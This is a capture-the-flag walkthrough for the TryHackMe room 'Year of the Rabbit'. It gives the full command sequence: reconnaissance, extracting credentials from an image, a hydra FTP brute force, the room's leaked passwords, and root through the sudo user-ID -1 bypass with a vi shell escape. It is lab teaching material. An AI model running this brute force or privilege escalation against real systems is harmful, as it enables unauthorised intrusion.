# [Year of the Rabbit](https://tryhackme.com/room/yearoftherabbit)

## Time to enter the warren...

# Flags

### What is the user flag?

1. Nmap scan to identify open ports and running services

```bash
nmap -sV IP
```

[SCREEN01]

2. Use Gobuster to discover hidden directories and files on the web server

```bash
gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,js
```

[SCREEN02]

3. The CSS file `http://IP/assets/style.css` contains a hidden reference to `/sup3r_s3cr3t_fl4g.php`

4. Disable javascript in `about:config` by setting `javascript.enabled` to `false`

[SCREEN03]

5. In `http://IP/sup3r_s3cret_fl4g.php` one of the requests reveals the hidden directory `/WExYY2Cv-qU`

[SCREEN04]

6. Navigate to `http://IP/WExYY2Cv-qU/` and download the `Hot_Babe.png` image

7. Use the `strings` command to extract login and passwords from the image file

```bash
strings Hot_Babe.png
```

[SCREEN05]

8. Brute force the FTP service with the discovered username
   - The credentials are `ftpuser:5iez1wGXKfPKQ`

```bash
hydra -l ftpuser -P passwords.txt ftp://IP
```

[SCREEN06]

9. Connect to the FTP server and get `Eli's_Creds.txt`

```bash
ftp IP
ls -la
get Eli's_Creds.txt
```

10. Decode the text in [dCode](https://www.dcode.fr/brainfuck-language)
    - The credentials are: `eli:DSpDiM1wAEwid`

[SCREEN07]

11. Connect via SSH using the decoded credentials. Search for files containing "s3cr3t", and retrieve the user flag

```bash
ssh eli@IP
find / -name "*s3cr3t*" 2>/dev/null
ls -la /usr/games/s3cr3t/
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!
su gwendoline
# Password: MniVCQVhQHUNI
cat /home/gwendoline/user.txt
```

[SCREEN08]

---

### What is the root flag?

1. Check what sudo privileges the current user has

```bash
sudo -l
```

[SCREEN09]

2. Exploit vi to get root access, and get the root flag

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
:!/bin/bash # in vi
cat /root/root.txt
```

[SCREEN10]
